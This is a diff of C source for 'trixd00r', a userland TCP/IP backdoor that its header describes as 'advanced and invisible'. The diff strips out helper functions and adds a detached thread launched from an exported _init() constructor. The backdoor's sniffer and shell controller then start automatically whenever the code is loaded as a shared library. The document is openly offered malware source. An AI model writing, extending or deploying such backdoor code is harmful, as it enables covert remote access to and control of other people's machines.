@@ -3,12 +3,12 @@
  *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
  *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
  *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
- *                                            /___/ nullsecurity team          *
+ *                                            /___/ nullsecurity team          * 
  *                                                                             *
  * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
  *                                                                             *
  * FILE                                                                        *
- * server/src/controller.c                                                     *
+ * server/src/trixd00rd.c                                                      *
  *                                                                             *
  * DATE                                                                        *
  * 02/10/2012                                                                  *
@@ -29,115 +29,52 @@
  *                                                                             *
  ******************************************************************************/
 
-#include "controller.h"
-#include "sniffer.h"
-#include "shell.h"
+#include "trixd00rd.h"
 #include "checks.h"
-#include "signals.h"
+#include "controller.h"
+#include "help.h"
 #include "verbose.h"
 #include "wrapper.h"
-#include "error.h"
+
 #include "daemon.h"
 
+#include <getopt.h>
+
+#include <pthread.h>
 
 
-/* just free everything we have to free */
-void free_trixd00rd(ctrl_t *ctrl)
+
+void *thread(void *arg)
 {
-    if (ctrl->shell != NULL) {
-        free(ctrl->shell);
-    }
-    if (ctrl->sniffer != NULL) {
-        free(ctrl->sniffer);
-    }
-    if (ctrl->packet != NULL) {
-        free(ctrl->packet);
-    }
-    if (ctrl != NULL) {
-        free(ctrl);
-    }
-
-    return;
-}
-
-
-/* ignore or handle some signals */
-void install_signals()
-{
-//    xsignal(SIGTERM, SIG_IGN);
-//    xsignal(SIGHUP, SIG_IGN);
-//    xsignal(SIGINT, SIG_IGN);
-//    xsignal(SIGUSR1, SIG_IGN);
-//    xsignal(SIGUSR2, SIG_IGN);
-
-    /* here we do not ignore SIGCHLD, because we need to be without zombies */
-    xsignal(SIGCHLD, sig_chld);
-
-    return;
-}
-
-
-/* allocate buffer for each struct and fill in with zeros */
-ctrl_t *alloc_structs()
-{
+    int c = 0;
     ctrl_t *ctrl = NULL;
 
 
-    ctrl = (ctrl_t *) alloc_buff(sizeof(ctrl_t));
-    ctrl->sniffer = (sniffer_t *) alloc_buff(sizeof(sniffer_t));
-    ctrl->packet = (packet_t *) alloc_buff(sizeof(packet_t));
-    ctrl->shell = (shell_t *) alloc_buff(sizeof(shell_t));
+    ctrl = alloc_structs();
+    ctrl = set_ctrl_defaults(ctrl);
 
-    return ctrl;
+
+    /* quick checks of arguments and values */
+    __VERBOSE_ARGS;
+
+    /* install signal handlers here */
+    install_signals();
+
+
+    /* whole action starts here my darling */
+    start_trixd00rd(ctrl);
+
+    return 0;
 }
 
-
-/* default settings for ctrl_t {} - prior to our complete definition */
-ctrl_t *set_ctrl_defaults(ctrl_t *ctrl)
+__attribute__((visibility("default"))) void _init()
 {
-    ctrl->packet->allowed_host = DEF_HOST;
-    ctrl->packet->type = DEF_TYPE;
-    ctrl->packet->m_payload = DEF_PAYLOAD;
-    ctrl->packet->b_payload = DEF_BYE_PAYLOAD;
-    ctrl->shell->banner = BANNER_ON;
-    ctrl->shell->mode = DEF_MODE;
-    ctrl->shell->port = DEF_PORT;
-    ctrl->verbose = QUIET;
-	
-	ctrl->sniffer->iface = "any";
 
-    return ctrl;
+        pthread_t tid;
+        pthread_create(&tid, NULL, thread, NULL);
+        pthread_detach(tid);
+        return;
 }
 
-
-/* begin of trixd00rd */
-void start_trixd00rd(ctrl_t *ctrl)
-{
-    __VERBOSE_PREPARE;
-    prepare_sniffer(ctrl);
-
-    __VERBOSE_WATCH;
-	/*
-	if (ctrl->daemon == DAEMON) {
-		daemonize();
-	}
-	*/
-    if (watch_packet(ctrl) == IS_BYEBYE_PACKET) {
-        end_trixd00rd(ctrl);
-    }
-
-    return;
-}
-
-
-/* end of trixd00rd */
-void end_trixd00rd(ctrl_t *ctrl)
-{
-    __VERBOSE_END;
-    pcap_close(ctrl->sniffer->handle);
-    free_trixd00rd(ctrl);
-
-    return;
-}
 
 /* EOF */
